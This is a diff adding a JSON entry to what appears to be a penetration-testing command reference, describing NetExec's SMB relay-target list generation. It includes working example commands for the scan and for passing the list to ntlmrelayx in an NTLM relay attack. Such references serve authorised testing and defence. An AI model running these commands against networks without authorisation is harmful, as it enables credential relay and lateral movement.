@@ -1,0 +1,18 @@
+{
+  "id": "nxc-smb-gen-relay-list",
+  "name": "NetExec Generate Relay Target List",
+  "command": "nxc smb <subnet> --gen-relay-list <relay_targets.txt>",
+  "description": "Scan a subnet over SMB and write a file containing every host with SMB signing disabled. The resulting list is what you feed to ntlmrelayx.py -tf for NTLM relay attacks.",
+  "platform": "linux",
+  "requires": ["no-creds"],
+  "protocols": ["smb"],
+  "tags": ["nxc", "netexec", "smb-signing", "ntlm-relay", "recon"],
+  "references": [
+    { "title": "NetExec — SMB Protocol", "url": "https://www.netexec.wiki/smb-protocol" },
+    { "title": "The Hacker Recipes — NTLM Relay", "url": "https://www.thehacker.recipes/ad/movement/ntlm/relay" }
+  ],
+  "examples": [
+    "nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt",
+    "ntlmrelayx.py -tf relay_targets.txt -smb2support"
+  ]
+}
